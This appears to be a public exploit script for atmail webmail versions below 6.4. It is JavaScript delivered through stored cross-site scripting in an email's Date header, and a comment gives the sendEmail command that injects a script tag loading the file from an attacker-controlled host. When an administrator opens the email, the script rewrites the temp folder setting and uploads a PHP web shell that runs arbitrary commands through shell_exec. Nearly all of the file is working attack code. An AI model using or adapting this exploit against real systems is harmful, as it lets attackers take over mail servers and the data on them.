/*
Serve this js file with a webserver. Send a crafted malicious email to the target and wait.
From Kali, you can send the malicious email using the following command:

# sendEmail -f attacker@evil.com -t admin@target.com -s 192.168.100.100 -u "Is this you?!" -o tls=no -o message-content-type=html -o message-header='Date: <script src="http://192.168.100.100/atmail-6.4-addAttachment-fileupload.js"></script>' -m "Nah, I was wrong!"

Vulnerable software: atmail < 6.4
Tested on: CentOS release 5.6 (Atmail Appliance)
Author: Werebug https://werebug.com
*/

function updateTmpPath() {
  var url = "/index.php/admin/settings/globalsave";
  var body = "fields[sql_user]=root&fields[tmpFolderBaseName]=";

  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        addEvilAttachment();
    }
  }
  xhr.open("POST", url);
  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  xhr.send(body);
}

function addEvilAttachment() {
  var url = "/index.php/mail/composemessage/addattachment/composeID/";

  var body = "--PWNED\n";
  body += 'Content-Disposition: form-data; name="newAttachment"; filename="cmd.php"\n';
  body += 'Content-Type:\n\n';
  body += '<?php echo shell_exec($_REQUEST["cmd"]); ?>\n';
  body += '--PWNED--';

  var xhr = new XMLHttpRequest();
  xhr.open("POST", url);
  xhr.setRequestHeader('Content-type','multipart/form-data; boundary=PWNED');
  xhr.send(body);
}

updateTmpPath();
